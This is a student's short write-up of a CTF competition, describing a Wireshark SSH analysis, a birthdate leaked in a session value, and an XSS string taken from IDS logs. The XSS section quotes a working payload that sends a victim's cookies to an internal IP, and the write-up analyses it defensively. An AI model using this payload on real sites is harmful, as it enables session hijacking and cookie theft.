# Cyber Quest Competition: Winter 2025

Cyber Quest 2025 is a CTF style competition sponsored by Cyber Quest and Counter Hack Challenges. Within this competition you are required to solve CTF and analysis style questions while competing against other students.

Below are some of the challenges faced.

## Wire Shark Packet Analysis

The first problem of the challenge is to monitor an SSH server within your enviorment. We are to analyze the traffic and identify what is occuring.

After some analysis I conclude that it is just standard SSH traffic with a few non fatal networking errors. Which is the correct answer! So far 1/1.

## Session Value Analysis

The second task we are to complete is finding sensitive data within a user session value. 

We are given the user session value of SES:53924537412317063\N7366400\N01031988\N.

I conclude that the sensitive user data leaked within the session value is at the end of the string. The 'N01031988' portion, since the 10/31/1988 aligns perfectly with a date... I conclude that it is the users birthday.

Which is once again correct! 2/2 so far!

## XSS Attempt

The next question we are given a string that was caputured by the IDS logs: `http://intranet/session.php?postvalue=<script>document.location="http://10.10.17.91/documents.php?c="+document.cookie;</script>`

We are told that the traffic returned a 200 code and are required to find out what is going on.

In this case I conclude 2 things, first that the server may be vulnerable to a cross site scripting attack. The returned code 200
shows that the input was processed without being properly sanitized or blocked. Secondly that the IP 10.10.17.91 is either an attacker or a compromised system.
The script is trying to exfiltrate session cookies to that IP, behavior that is common with a compromised internal system or an attacker controlled host.

Once again I was correct leading to a running score of 3/3.

## Conclusion

All in all the competion had 25 questions, of which I got 23 correct! The competition was a great way to test my understanding of cyber security and was an especially great way to get more practical experience with wire shark!



